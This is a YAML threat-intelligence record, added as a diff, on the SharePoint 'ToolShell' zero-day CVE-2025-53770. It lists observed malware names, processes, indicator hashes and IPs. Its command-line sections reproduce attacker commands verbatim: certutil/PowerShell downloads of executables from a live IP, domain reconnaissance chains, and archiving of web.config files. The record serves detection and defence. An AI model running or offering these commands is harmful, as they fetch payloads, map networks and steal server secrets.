@@ -1,0 +1,107 @@
+description: Microsoft SharePoint zero-day vulnerability CVE-2025-53770, dubbed ToolShell,
+  allows unauthenticated remote code execution on vulnerable servers.
+malware_families:
+- client.exe
+- agent.x64.exe
+- project1.exe
+TTPs:
+  processes:
+  - powershell.exe
+  - certutil.exe
+  - tasklist.exe
+  - ipconfig.exe
+  - net.exe
+  - nltest.exe
+  - systeminfo.exe
+  - backup.exe
+  - arp.exe
+  commandline:
+  - powershell -Command "certutil -urlcache -split -f http://134.199.202.205/client.exe
+    C:\\Windows\\Temp\\client.exe >'C:\\Program Files\\Common Files\\microsoft shared\\Web
+    Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js'"
+  - powershell -Command "Set-Content -Path 'C:\\Program Files\\Common Files\\microsoft
+    shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js' -Value (whoami)"
+  - powershell -Command "Set-Content -Path 'C:\\Program Files\\Common Files\\microsoft
+    shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js' -Value (tasklist
+    /svc)"
+  - /c query user > query_user.txt && tasklist /svc > tasklist_info.txt && ipconfig
+    /all > ipconfig_all.txt && net user > net_user.txt && net user /domain > net_user_domain.txt
+    && net accounts /domain > net_accounts_domain.txt && net group /domain > net_group_domain.txt
+    && net group Domain Admins /domain > net_group_Domain_Admins_domain.txt && net
+    group Domain Controllers /domain > net_group_Domain_Controllers_domain.txt &&
+    net group Domain Computers /domain > net_group_Domain_Computers_domain.txt &&
+    nltest /domain_trusts > domain_trusts.txt && net view > net_view.txt && net start
+  -  net_start.txt && systeminfo > systeminfo.txt && arp -a
+  - /c backup.exe a -r -y logs.rar C:\\inetpub\\wwwroot\\wss\\VirtualDirectories\\**\\web.config
+  - /c backup.exe a -r -y -df log.rar c:\\*.txt C:\\inetpub\\wwwroot\\wss\\VirtualDirectories\\**\\web.config
+  - certutil -urlcache -split -f http://134.199.202.205/agent.x64.exe C:\\Users\\Public\\agent.x64.exe
+  powershell:
+  - powershell -Command "certutil -urlcache -split -f http://134.199.202.205/client.exe
+    C:\\Windows\\Temp\\client.exe >'C:\\Program Files\\Common Files\\microsoft shared\\Web
+    Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js'"
+  - powershell -Command "Set-Content -Path 'C:\\Program Files\\Common Files\\microsoft
+    shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js' -Value (whoami)"
+  - powershell -Command "Set-Content -Path 'C:\\Program Files\\Common Files\\microsoft
+    shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js' -Value (tasklist
+    /svc)"
+  scripting_engine: null
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - powershell.exe -> http://134.199.202.205/client.exe
+  - certutil.exe -> http://134.199.202.205/agent.x64.exe
+  file_activity:
+  - C:\\Windows\\Temp\\client.exe
+  - C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\debug.js
+  - c:\\temp\\test.bat
+  - query_user.txt
+  - tasklist_info.txt
+  - ipconfig_all.txt
+  - net_user.txt
+  - net_user_domain.txt
+  - net_accounts_domain.txt
+  - net_group_domain.txt
+  - net_group_Domain_Admins_domain.txt
+  - net_group_Domain_Controllers_domain.txt
+  - net_group_Domain_Computers_domain.txt
+  - domain_trusts.txt
+  - net_view.txt
+  - net_start.txt
+  - systeminfo.txt
+  - arp_a.txt
+  - C:\\inetpub\\wwwroot\\wss\\VirtualDirectories\\**\\web.config
+  - logs.rar
+  - log.rar
+  - C:\\Users\\Public\\agent.x64.exe
+  persistence: null
+  pipes: null
+  process_relations: null
+IOCs:
+  hashes:
+  - fd03d881f0b3069f5adec6ae69181899e72fd27b3e75bb9075d0798ed3184274
+  - 04f7326c40c33fda51010d067915a1e50b63e00b4ab86db00158d5e067a78ff6
+  - 430cf700c7f1b625fded4da4084a0a6c0240b15d52e624a2361bc2512ca2355d
+  IPs:
+  - 107.191.58[.]76
+  - 104.238.159[.]149
+  - 96.9.125[.]147
+  - 103.186.30[.]186
+  - 108.162.221[.]103
+  - 128.49.100[.]57
+  - 154.47.29[.]41
+  - 62.158.14[.]149
+  - 62.158.14[.]86
+  - 62.158.19[.]169
+  - 62.158.90[.]110
+  - 62.158.94[.]121
+  - 62.158.94[.]72
+  - 18.143.202[.]126
+  - 18.143.202[.]156
+  - 18.143.202[.]185
+  - 18.143.202[.]204
+  - 45.40.52[.]75
+  domains: null
+  URLs: null
+reference: https://www.security.com/threat-intelligence/toolshell-zero-day-sharepoint-cve-2025-53770
+date_of_publication: July 21, 2025
+file_creation_date: July 24, 2025
